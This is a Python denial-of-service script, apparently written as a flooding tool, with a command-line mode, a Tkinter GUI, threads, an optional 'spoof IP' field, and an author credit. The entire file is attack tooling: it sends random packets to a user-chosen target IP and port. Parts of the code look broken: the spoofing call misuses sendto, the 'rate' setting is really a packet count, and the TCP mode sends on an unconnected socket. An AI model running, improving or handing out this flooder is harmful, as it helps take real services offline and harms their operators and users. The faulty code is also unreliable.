import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
import argparse
from urllib.parse import urlparse
import logging
import tkinter as tk
from tkinter import messagebox

# Initialize logging
logging.basicConfig(filename='ddos_attack.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Advanced features: Multi-threading, logging, and command-line parsing
def send_packets(ip, port, times, protocol, spoof_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if protocol == "UDP" else socket.SOCK_STREAM)
    bytes = random._urandom(1490)
    sent = 0

    for _ in range(times):
        try:
            if spoof_ip:
                sock.sendto(bytes, (ip, port), (spoof_ip, random.randint(1, 65535)))
            else:
                sock.sendto(bytes, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            logging.info(f"Sent {sent} packets to {ip} through port:{port}")
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break

def validate_target(ip):
    try:
        socket.gethostbyname(ip)
        return True
    except socket.error:
        return False

# Parsing command-line arguments
parser = argparse.ArgumentParser(description="Advanced DDoS Attack Script")
parser.add_argument("ip", type=str, help="IP address of the target")
parser.add_argument("port", type=int, help="Port to attack")
parser.add_argument("-p", "--protocol", type=str, default="UDP", choices=["UDP", "TCP"], help="Protocol to use (UDP/TCP)")
parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads to use")
parser.add_argument("-r", "--rate", type=int, default=100, help="Packets per second")
parser.add_argument("-s", "--spoof_ip", type=str, help="IP address to spoof")
parser.add_argument("-g", "--gui", action='store_true', help="Launch GUI mode")
args = parser.parse_args()

# Target Validation
if not validate_target(args.ip):
    print(f"Target IP {args.ip} is unreachable or invalid.")
    sys.exit()

# GUI Mode
if args.gui:
    def start_attack():
        ip = ip_entry.get()
        port = int(port_entry.get())
        protocol = protocol_var.get()
        threads = int(threads_entry.get())
        rate = int(rate_entry.get())
        spoof_ip = spoof_ip_entry.get() if spoof_ip_var.get() else None

        if not validate_target(ip):
            messagebox.showerror("Error", "Invalid IP address")
            return

        os.system("clear")
        os.system("figlet DDos Attack Starting")
        print(f"Author   : Adil Munawar")
        print(f"Instagram: https://www.instagram.com/how_adil")
        print(f"Target   : {ip}")
        print(f"Port     : {port}")
        print(f"Protocol : {protocol}")
        print(f"Threads  : {threads}")
        print(f"Rate     : {rate} packets/sec")
        print("[====================] Attack Starting\n")

        # Creating threads for multi-threaded packet sending
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, port, rate, protocol, spoof_ip))
            threads_list.append(t)
            t.start()

        # Wait for threads to finish
        for t in threads_list:
            t.join()

        print("[====================] Attack Finished\n")

    root = tk.Tk()
    root.title("Advanced DDoS Attack Script")

    tk.Label(root, text="Target IP").grid(row=0)
    tk.Label(root, text="Port").grid(row=1)
    tk.Label(root, text="Protocol").grid(row=2)
    tk.Label(root, text="Threads").grid(row=3)
    tk.Label(root, text="Rate").grid(row=4)
    tk.Label(root, text="Spoof IP").grid(row=5)

    ip_entry = tk.Entry(root)
    port_entry = tk.Entry(root)
    protocol_var = tk.StringVar(value="UDP")
    protocol_menu = tk.OptionMenu(root, protocol_var, "UDP", "TCP")
    threads_entry = tk.Entry(root)
    rate_entry = tk.Entry(root)
    spoof_ip_var = tk.BooleanVar()
    spoof_ip_check = tk.Checkbutton(root, variable=spoof_ip_var)
    spoof_ip_entry = tk.Entry(root)

    ip_entry.grid(row=0, column=1)
    port_entry.grid(row=1, column=1)
    protocol_menu.grid(row=2, column=1)
    threads_entry.grid(row=3, column=1)
    rate_entry.grid(row=4, column=1)
    spoof_ip_check.grid(row=5, column=1)
    spoof_ip_entry.grid(row=5, column=2)

    tk.Button(root, text="Start Attack", command=start_attack).grid(row=6, column=0, columnspan=3)

    root.mainloop()
else:
    # Start the attack
    os.system("clear")
    os.system("figlet DDos Attack Starting")
    print(f"Author   : Adil Munawar")
    print(f"Instagram: https://www.instagram.com/how_adil")
    print(f"Target   : {args.ip}")
    print(f"Port     : {args.port}")
    print(f"Protocol : {args.protocol}")
    print(f"Threads  : {args.threads}")
    print(f"Rate     : {args.rate} packets/sec")
    print("[====================] Attack Starting\n")

    # Creating threads for multi-threaded packet sending
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=send_packets, args=(args.ip, args.port, args.rate, args.protocol, args.spoof_ip))
        threads.append(t)
        t.start()

    # Wait for threads to finish
    for t in threads:
        t.join()

    print("[====================] Attack Finished\n")
